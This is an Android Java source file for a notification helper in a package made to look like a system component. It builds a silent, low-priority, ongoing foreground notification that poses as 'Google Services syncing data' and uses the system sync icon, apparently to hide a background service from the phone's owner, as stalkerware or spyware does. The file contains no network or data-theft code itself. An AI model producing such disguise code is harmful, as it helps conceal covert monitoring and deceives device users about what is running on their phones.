package com.android.system.protection.utils;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import androidx.core.app.NotificationCompat;

public class NotificationHelper {

    public static final String CHANNEL_ID = "sync_channel";
    public static final int NOTIFICATION_ID = 999;

    public static void createNotificationChannel(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Sync",
                    NotificationManager.IMPORTANCE_LOW // صامت تماماً
            );
            channel.setShowBadge(false);
            
            NotificationManager manager = context.getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    public static Notification getForegroundNotification(Context context) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                .setContentTitle("Google Services")
                .setContentText("Syncing data background...")
                .setSmallIcon(android.R.drawable.stat_notify_sync) // أيقونة المزامنة الافتراضية للنظام
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true);

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            builder.setSound(null).setVibrate(null);
        }

        return builder.build();
    }
}
